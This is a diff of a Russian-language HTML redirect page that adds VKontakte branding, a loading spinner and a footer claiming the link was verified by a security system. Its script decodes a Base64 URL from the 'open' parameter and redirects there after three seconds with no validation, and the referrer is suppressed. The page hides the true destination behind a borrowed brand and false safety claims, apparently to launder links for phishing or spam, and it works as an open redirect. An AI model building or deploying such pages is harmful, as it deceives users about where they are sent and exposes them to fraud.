@@ -1,23 +1,122 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="referrer" content="no-referrer">
-    <title>Перенаправление...</title>
+    <title>Безопасный переход...</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 15%; background: #f9f9f9; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%); 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            color: #333; 
+        }
+
+        .redirect-container {
+            background: #ffffff;
+            padding: 40px 30px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+
+        .logo-area {
+            margin-bottom: 25px;
+        }
+
+        /* Стильный временный логотип, если нет картинки */
+        .logo-placeholder {
+            font-size: 24px;
+            font-weight: 700;
+            color: #3498db;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .logo-img {
+            max-width: 150px;
+            max-height: 60px;
+            object-fit: contain;
+        }
+
+        .loader-ring {
+            display: inline-block;
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(52, 152, 219, 0.1);
+            border-radius: 50%;
+            border-top-color: #3498db;
+            animation: spin 1s ease-in-out infinite;
+            margin: 20px 0;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        h2 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #2c3e50;
+        }
+
+        p {
+            font-size: 14px;
+            color: #7f8c8d;
+            line-height: 1.5;
+        }
+
+        .footer-note {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #edf2f7;
+            font-size: 12px;
+            color: #95a5a6;
+        }
     </style>
 </head>
 <body>
-    <p>Пожалуйста, подождите, идет загрузка страницы...</p>
+
+    <div class="redirect-container">
+        <!-- БЛОК ЛОГОТИПА -->
+        <div class="logo-area">
+            <!-- Если есть прямая ссылка на логотип, замените src. Если нет — покажется текст ниже -->
+            <img src="https://thumb.cloud.mail.ru/weblink/thumb/xw1/TfKk/QGyS93cW7/PNG%20-%20digital/VK%20Logo.png?mt=1684832836000" alt="Логотип" class="logo-img">
+            <div class="logo-placeholder">ВКонтакте</div>
+        </div>
+
+        <div class="loader-ring"></div>
+
+        <h2>Проверка соединения...</h2>
+        <p>Вы перенаправляетесь на сайт партнера. <br>Это займет не более 3 секунд.</p>
+
+        <!-- БЛОК С ПОДПИСЬЮ -->
+        <div class="footer-note">
+            Ссылка проверена системой безопасности. <br>
+            © 2026 Защищенное перенаправление трафика.
+        </div>
+    </div>
+
     <script>
-        // Функция берет параметр из ссылки, расшифровывает Base64 и редиректит через 3 секунды
         const urlParams = new URLSearchParams(window.location.search);
         const encoded = urlParams.get('open');
         if (encoded) {
             setTimeout(() => {
                 window.location.replace(atob(encoded));
-            }, 3000); // 3000 миллисекунд = 3 секунды задержки
+            }, 3000); // 3 секунды задержки
+        } else {
+            document.querySelector('h2').innerText = "Ошибка доступа";
+            document.querySelector('p').innerText = "Действие заблокировано или ссылка указана неверно.";
+            document.querySelector('.loader-ring').style.display = 'none';
         }
     </script>
 </body>
